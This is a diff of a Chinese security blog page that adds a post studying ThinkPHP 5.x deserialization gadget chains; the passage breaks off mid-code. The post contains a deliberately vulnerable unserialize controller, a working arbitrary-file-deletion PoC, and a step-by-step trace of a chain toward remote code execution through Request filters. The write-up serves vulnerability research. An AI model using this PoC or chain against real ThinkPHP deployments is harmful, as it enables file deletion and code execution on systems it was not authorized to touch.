@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
@@ -151,13 +151,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-count">84</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -183,6 +183,416 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://z1d10t.github.io/post/60ce7176.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695400865185.png">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10tのBlog">
+      <meta itemprop="description" content="邪王真眼是最强的！">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Z1d10tのBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/post/60ce7176.html" class="post-title-link" itemprop="url">Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-12-12 22:31:30 / 修改时间：22:33:06" itemprop="dateCreated datePublished" datetime="2023-12-12T22:31:30+08:00">2023-12-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">-漏洞复现</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <span id="more"></span>
+
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="namespace命名空间和子命名空间"><a href="#namespace命名空间和子命名空间" class="headerlink" title="namespace命名空间和子命名空间"></a>namespace命名空间和子命名空间</h2><p>首先我们需要知道为什么需要命名空间呢？</p>
+<p>在大型PHP项目中，可能存在大量的类，函数和常量，而这些可能来自不同的库和团队，为了避免冲突，php就引进了命名空间。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Animals\cat;</span><br><span class="line">class cat&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;miao~&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cat = new cat();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Animals\dog;</span><br><span class="line">class dog&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;wow&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Dog = new dog();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Animals\bird;</span><br><span class="line">class bird&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;6&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Bird = new bird();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以上例子中 Animals就是一个命令空间 而cat dog bird 都是其子命名空间</p>
+<p>在创建实例的时候这里也有讲究 </p>
+<p>一种是直接在相关类之后进行创建实例 比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">namespace Animals\cat;</span><br><span class="line">class cat&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;miao~&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cat = new cat();</span><br></pre></td></tr></table></figure>
+
+<p>一种是可以在任意地方创建 但是要加上命名空间 即：<code>\命名空间\子命令空间\class类名</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506070640-a0e9e936-106b-44f6-85f1-ee981404a6f3.png" alt="img"></p>
+<p>还有一个知识点是利用use 在这里可以理解为是require inlcude这样的函数 </p>
+<p>即可以在当前命名空间使用引入其他命名空间</p>
+<p>比如根据代码顺序 我们创建实例的代码都属于是bird命名空间里的</p>
+<p>也就是bird无需指定命名空间 直接申明即可</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506380739-b91e4da1-9830-4901-80af-9985cee77b0a.png" alt="img"></p>
+<p>如果使用use 则直接创建实例时无需在之前加上命名空间了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506494614-a124ea63-0308-4205-8957-45b55753a1bd.png" alt="img"></p>
+<h2 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h2><p>通过关键字extends来实现</p>
+<p>通过一个demo简单理解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class father&#123;</span><br><span class="line">    public $name = &quot;Tom&quot;;</span><br><span class="line">    public $age = 100;</span><br><span class="line">    public function saysomething()&#123;</span><br><span class="line">        echo &quot;father is saying&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function sleeping()&#123;</span><br><span class="line">        echo &quot;i am sleeping&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class son extends father&#123;</span><br><span class="line">    public $name = &quot;Lihua&quot;;</span><br><span class="line">    public function saysomething()&#123;</span><br><span class="line">        echo &quot;son is saying&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function parentsaying()&#123;</span><br><span class="line">        parent::saysomething();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Son = new son;</span><br><span class="line">echo $Son-&gt;age.&quot;\n&quot;;</span><br><span class="line">$Son-&gt;saysomething();</span><br><span class="line">$Son-&gt;parentsaying();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701507164342-e144b983-4bd2-4d60-8122-a6250e50533d.png" alt="img"></p>
+<p>可以看到子类会继承父类中的属性和方法，当然只限于（public和protected类型而private是无法继承也无法访问的）子类同名函数会覆盖父类，子类也可以通过<code>parent::method</code>访问父类被覆盖的方法。</p>
+<h2 id="trait修饰符"><a href="#trait修饰符" class="headerlink" title="trait修饰符"></a>trait修饰符</h2><p>trait修饰符使得被修饰的类可以复用，增加了代码的复用性</p>
+<p>即我们可以在一个类中包含一个被trait修饰的类 并且使用其方法和属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">trait test&#123;</span><br><span class="line">    public $a = &quot;ok&quot;;</span><br><span class="line">    public function test()&#123;</span><br><span class="line">        echo &quot;test\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class impl&#123;</span><br><span class="line">    use test;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;impl\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$t=new impl();</span><br><span class="line">$t-&gt;test();</span><br><span class="line">echo $t-&gt;a;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701507738113-fb2c8dff-3d2e-40fe-a6d3-33cde99fe838.png" alt="img"></p>
+<p>还有一个b神例子也可以来理解一下 方便之后去调试thinkphp链子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace np1\A;</span><br><span class="line"></span><br><span class="line">use np2\A\Boogipop;</span><br><span class="line"></span><br><span class="line">class Z1d10t&#123;</span><br><span class="line">    use Boogipop;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;dawn_construct\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">namespace np2\A;</span><br><span class="line">require(&quot;2.php&quot;);</span><br><span class="line">use np1\A\Z1d10t;</span><br><span class="line">trait Boogipop&#123;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;tostring\n&quot;;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Z1d10t();</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701508172292-6203230e-df2e-41b6-96e6-83ae66b3fe69.png" alt="img"></p>
+<p>可以看到我们用trait修饰了Boogipop类并且在Z1d10t中use复用了它</p>
+<p>然后我们创建一个Z1d10t的类 并且直接输出他</p>
+<p>那么我们知道当直接输出一个对象时候就会调用__toString魔术方法</p>
+<p>但是Z1d10t中并没有__toStiring魔术方法而Boogipop类中有却被调用了 这就很神奇了</p>
+<h1 id="5-1-x版本分析"><a href="#5-1-x版本分析" class="headerlink" title="5.1.x版本分析"></a>5.1.x版本分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>- </p>
+<p>那么当然是看官方文档<a target="_blank" rel="noopener" href="https://www.thinkphp.cn/doc">https://www.thinkphp.cn/doc</a></p>
+<p>这里建议在安装时老老实实利用composer 用git的时候报了好多错</p>
+<p>把下载的源码包放到phpstudy根目录下</p>
+<p>然后就是phpstudy联动phpstorm 推荐一篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62989306/article/details/126913050">phpstorm+phpstudy调试thinkphp_如何在phpstorm中调试php程序-CSDN博客</a></p>
+<p>这里遇到的坑就是我composer下载指定thinkphp版本为5.1.37时 他自动下载为thinkphp5.1.42</p>
+<p>折磨了我一下午 最终问gpt得到了解决方法</p>
+<p>在我们下好thinkphp5.1.42目录下 有个composer.json 将原来的5.1.*改为指定的5.1.37</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701517846484-9322664c-576b-4862-a671-9f8c4d7b8029.png" alt="img"></p>
+<p>然后 <code>composer update</code> 他就会自动重新帮我们拉取依赖 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701517905050-35a888c9-067e-45a8-ac54-df0d659b36cb.png" alt="img"></p>
+<p>最终解决了 可以愉快的调试了</p>
+<h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><p>首先我们需要设置一个触发点 将控制器中的index控制器修改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index($input=&quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;ThinkPHP5_Unserialize:\n&quot;;</span><br><span class="line">        unserialize(base64_decode($input));</span><br><span class="line">        return &#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function hello($name = &#x27;ThinkPHP5&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        return &#x27;hello,&#x27; . $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在反序列化入口函数处打一个断点</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701771728123-14c8df13-e5d2-454d-8f6f-26237ee644c5.png" alt="img"></p>
+<p>先测试我们的poc 可以发现是可以正常触发的</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701771807938-8ed628fb-4a11-4ea4-a9a1-db0fe81e2f43.png" alt="img"></p>
+<p>接下来一步步调试</p>
+<p>首先是进入了Windows.php的Windows类的析构函数</p>
+<p>我们观察poc 也可以发现最外层套的是<code>think\process\pipes\Windows</code>对象 因此首先会进入该对象<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772315555-d5626d78-382d-4f16-99f6-3d4a602589b0.png" alt="img"></p>
+<p>这里windows类还继承了Pipes这个抽象类</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772344277-6435c36f-0019-440b-a1df-394f527d018b.png" alt="img"></p>
+<p>继续跟进 进入了removeFIles这个函数中</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772458028-3eae1587-619c-45f4-a948-b29042e3c6d4.png" alt="img"></p>
+<p>该方法会遍历files数组 然后删除</p>
+<p>这里调用了一个<code>$this-&gt;files</code>并且$files是可控的因此这里还存在一个任意文件删除的漏洞</p>
+<p>poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">class Pipes&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Windows extends Pipes</span><br><span class="line">&#123;</span><br><span class="line">private $files = [];</span><br><span class="line"></span><br><span class="line">public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;files=[&#x27;需要删除文件的路径&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>file_exists</code>函数对<code>$filename</code>进行处理  并且此时<code>$filename</code>会被当作字符串string进行处理</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773147093-5262c202-22e6-4d65-bb57-4cf9ebdae72e.png" alt="img"></p>
+<p>并且根据我们的poc可知 我们传入的是 Pivot对象</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773205554-8aeb5f36-68e4-4c53-8750-89cd614fe876.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773248506-71e26aca-d9cb-40d7-9972-064416dc6897.png" alt="img"></p>
+<p>那当一个对象当作字符串被处理时，会触发__toString魔术方法</p>
+<p>继续跟进 发现难道不应该触发Pivot函数的__toString魔术方法吗 为什么会跳到Conversion对象</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773714546-13e03ac3-a462-4633-92a3-9e59c7a4b68e.png" alt="img"></p>
+<p>这里就用到了之前说的trait复用的知识点了</p>
+<p>我们可以看到 Convertion被trait修饰了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773898203-2f4d1683-7279-4aa4-97f3-29d28fd667ed.png" alt="img"></p>
+<p>并且Pivot对象基类是Model 它内部没有toString魔术方法 </p>
+<p>但是构造函数中调用的是父类的构造方法</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701774046856-246081eb-2a34-4ff6-8c3f-dc09dd85a82b.png" alt="img"></p>
+<p>我们继续跟进Model类 可以发现它use了<code>model\concern\Conversion</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775270704-d7d5025e-ece6-4412-a53c-0e18d905cfb6.png" alt="img"></p>
+<p>因此Model复用了Conversion类 而它又是Pivot类的父类 </p>
+<p>当Pivot对象被当作字符串输出的时候 就会调用Conversion类的toString方法</p>
+<p>这也就是为什么我跟进链子到了 Converison类的tostring方法了 </p>
+<p>思路清晰 继续</p>
+<p>接着调用了toJson函数</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775565756-3c86b4e4-0a76-4460-a8e9-23d85dc135a0.png" alt="img"></p>
+<p>接着调用了toArray函数 然后转为了json字符串 继续跟进toArray</p>
+<p>先遍历this-&gt;append属性 取出键值对 对应我们poc中的</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775854515-40420207-d28d-4c61-86fb-026aedf3c565.png" alt="img"></p>
+<p>key为Z1d10t</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775999642-0e5e090f-8e16-436c-bf49-8f31f4aa886e.png" alt="img"></p>
+<p>接着进入getRelation函数中</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776064817-0cafd189-bcf1-41a7-b4a9-096cae286ecf.png" alt="img"></p>
+<p>因为我们没有给<code>$this-&gt;relation</code>赋值 因此return null就结束并且出来了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776176513-ca575be3-1319-4576-af3d-6f35ee28351d.png" alt="img"></p>
+<p>接着进入getAttr函数</p>
+<p>poc中我们将<code>$this-&gt;data</code>赋值为一个对象 因此return一个Request对象之后 就会退出该方法 出来</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776480917-1ed0551f-cb6c-4d22-a302-eacaf644d712.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701847452355-9384cf4e-7e1d-44cb-a11d-320102b41f90.png" alt="img"></p>
+<p><code>$relation</code>变为了Request对象 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776652298-17f4b401-e97e-4293-9f0f-cd0dad786c79.png" alt="img"></p>
+<p>调用<code>$relation-&gt;visible()</code> 并且参数为<code>[calc,calc.exe]</code>  而Requset类是没有visible函数的</p>
+<p>因此会调用它的__call方法 </p>
+<p>一般PHP中的__call方法都是用来进行容错或者是动态调用,所以一般会在__call方法中使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__call_user_func($method, $args) </span><br><span class="line">__call_user_func_array([$obj,$method], $args)</span><br></pre></td></tr></table></figure>
+
+<p>我们跟进它</p>
+<p>发现它调用 <code>call_user_func_array</code>方法 这可不是一个好方法:)</p>
+<p>并且这里$hook是我们可控的 因此我们可以设计一个数组<code>$hook= &#123;“visable”=&gt;”任意method”&#125;</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777056201-b2143552-59e9-49a5-88a2-70c0d3f5632d.png" alt="img"></p>
+<p>但是在这里array_unshift函数在之前的<code>[calc,calc.exe]</code>数组开头中插入Request对象 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777151041-f0aa6009-994d-4ac8-aa00-307fb4075910.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777278378-bdcef651-2589-47c6-9af7-e41df72e38d6.png" alt="img"></p>
+<p>我们知道<code>call_user_func_array</code>函数会把第一个参数作为回调函数调用，第二参数是一个数组，并且将数组作为回调函数的参数</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701778235498-ff04b99e-9809-47cb-a359-5531b29dd4d7.png" alt="img"></p>
+<p><code>$this-&gt;hook</code>为一个数组并且我们可控 然后取键名为visible的值</p>
+<p>那么我们只能是（偷的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array([$obj,&quot;任意方法&quot;],[$this,任意参数])</span><br><span class="line">也就是</span><br><span class="line">$obj-&gt;$func($this,$argv)</span><br></pre></td></tr></table></figure>
+
+<p>那这里需要知道的是回调函数不光只是简简单单的普通函数</p>
+<p>还可以是对象的方法 包括静态类方法</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779197684-4971d72a-f30b-46a7-8878-ba2e5b952d49.png" alt="img"></p>
+<p>因此这里就可以理解上述中call_user_func_array中第一个参数函数格式为<code>[$obj,&quot;任意方法&quot;]</code>也就是对象的方法</p>
+<p>而参数由于array_unshift函数的缘故第一个为<code>$this</code>也就是一个对象</p>
+<p><code>$obj-&gt;$func($this,$argv)</code>那么直接用这种方式去RCE 很难的拉</p>
+<p>此时就要用到了Request类中一个特殊的功能就是过滤器filter</p>
+<p>并且ThinkPHP中的多个RCE漏洞都是由于这个过滤器</p>
+<p>所以我们可以去尝试覆盖filter方法去RCE</p>
+<p>我们先来看看这个filter</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">private function filterValue(&amp;$value, $key, $filters)</span><br><span class="line">    &#123;</span><br><span class="line">        $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">        foreach ($filters as $filter) &#123;</span><br><span class="line">            if (is_callable($filter)) &#123;</span><br><span class="line">                // 调用函数或者方法过滤</span><br><span class="line">                $value = call_user_func($filter, $value);</span><br><span class="line">            &#125; elseif (is_scalar($value)) &#123;</span><br><span class="line">                if (false !== strpos($filter, &#x27;/&#x27;)) &#123;</span><br><span class="line">                    // 正则过滤</span><br><span class="line">                    if (!preg_match($filter, $value)) &#123;</span><br><span class="line">                        // 匹配不成功返回默认值</span><br><span class="line">                        $value = $default;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; elseif (!empty($filter)) &#123;</span><br><span class="line">                    // filter函数不存在时, 则使用filter_var进行过滤</span><br><span class="line">                    // filter为非整形值时, 调用filter_id取得过滤id</span><br><span class="line">                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));</span><br><span class="line">                    if (false === $value) &#123;</span><br><span class="line">                        $value = $default;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该方法调用了<code>call_user_func</code> 但是在这里<code>$value</code>参数不可直接控 </p>
+<p>继续寻找</p>
+<p>发现input函数调用了这个filterValue</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779812219-588beaf8-9bb2-44da-abb7-9c14ed94ec2c.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 